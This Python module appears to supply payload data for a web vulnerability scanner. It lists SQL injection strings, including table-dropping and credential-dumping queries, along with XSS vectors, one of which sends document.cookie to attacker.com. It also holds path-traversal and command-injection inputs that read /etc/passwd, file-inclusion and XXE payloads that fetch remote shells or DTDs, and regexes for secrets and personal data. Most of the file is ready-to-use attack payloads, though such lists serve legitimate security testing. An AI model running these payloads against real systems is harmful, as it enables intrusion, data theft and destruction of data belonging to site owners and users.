"""
Payloads for vulnerability testing
Contains various attack vectors for OWASP Top 10 vulnerabilities
"""

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username, password FROM users--",
    "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
    "1; DROP TABLE users--",
    "1'; DROP TABLE users-- ",
    "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR SLEEP(5)--",
    "' WAITFOR DELAY '0:0:5'--",
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "<details open ontoggle=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
    "'\"><script>alert('XSS')</script>",
    "\"><svg/onload=alert('XSS')>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",
    "<IMG \"\"\"><SCRIPT>alert('XSS')</SCRIPT>\">",
    "<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41)</SCRIPT>",
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../",
    "..\\",
    "../../",
    "..\\..\\",
    "../../../",
    "..\\..\\..\\",
    "../../../../",
    "..\\..\\..\\..\\",
    "../../../../../",
    "..\\..\\..\\..\\..\\",
    "../../../../../../",
    "..\\..\\..\\..\\..\\..\\",
    "../../../../../../../",
    "..\\..\\..\\..\\..\\..\\..\\",
    "../../../../../../../../",
    "..\\..\\..\\..\\..\\..\\..\\..\\",
    "../../../../../../../../../",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\",
    "../../../../../../../../../../",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\win.ini",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",
    "..%5c",
    "%252e%252e%255c",
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls",
    "& dir",
    "| ls",
    "|| ls",
    "; cat /etc/passwd",
    "& type C:\\Windows\\win.ini",
    "| cat /etc/passwd",
    "; whoami",
    "& whoami",
    "| whoami",
    "`whoami`",
    "$(whoami)",
    "; id",
    "& id",
    "| id",
    "; uname -a",
    "& ver",
    "| uname -a",
    "; sleep 5",
    "& timeout 5",
    "| sleep 5",
    "; ping -c 5 127.0.0.1",
    "& ping -n 5 127.0.0.1",
    "| ping -c 5 127.0.0.1",
    "\n/bin/ls",
    "\ncat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
]

# LFI/RFI Payloads
FILE_INCLUSION_PAYLOADS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system.ini",
    "C:\\boot.ini",
    "file:///etc/passwd",
    "file://C:/Windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://ls",
    "http://attacker.com/shell.txt",
    "https://attacker.com/shell.txt",
]

# XXE Payloads
XXE_PAYLOADS = [
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xxe;</foo>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
<foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",
]

# CSRF Test Patterns
CSRF_INDICATORS = [
    "csrf_token",
    "csrftoken",
    "csrf-token",
    "_csrf",
    "authenticity_token",
    "anti-csrf-token",
    "__RequestVerificationToken",
    "csrfmiddlewaretoken",
]

# Sensitive Information Patterns
SENSITIVE_INFO_PATTERNS = {
    "api_key": r"api[_-]?key['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{20,})",
    "aws_key": r"AKIA[0-9A-Z]{16}",
    "secret_key": r"secret[_-]?key['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{20,})",
    "password": r"password['\"]?\s*[:=]\s*['\"]?([^\s'\"]{6,})",
    "private_key": r"-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----",
    "jwt": r"eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*",
    "slack_token": r"xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[a-zA-Z0-9]{24,32}",
    "github_token": r"gh[pousr]_[A-Za-z0-9_]{36}",
    "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
    "phone": r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b",
    "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
    "credit_card": r"\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b",
}

# Security Headers to Check
SECURITY_HEADERS = [
    "X-Frame-Options",
    "X-Content-Type-Options",
    "X-XSS-Protection",
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Permitted-Cross-Domain-Policies",
    "Referrer-Policy",
    "Feature-Policy",
    "Permissions-Policy",
]

# Common Vulnerable Endpoints
COMMON_ENDPOINTS = [
    "/admin",
    "/admin/login",
    "/administrator",
    "/login",
    "/wp-admin",
    "/phpmyadmin",
    "/phpMyAdmin",
    "/console",
    "/debug",
    "/api",
    "/api/v1",
    "/api/docs",
    "/swagger",
    "/graphql",
    "/.env",
    "/.git",
    "/.git/config",
    "/config",
    "/backup",
    "/db",
    "/database",
    "/robots.txt",
    "/sitemap.xml",
    "/crossdomain.xml",
    "/.well-known/security.txt",
]

# User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "WebSecScanner/1.0 (Security Scanner; +https://github.com/afhacker/websecscanner)",
]
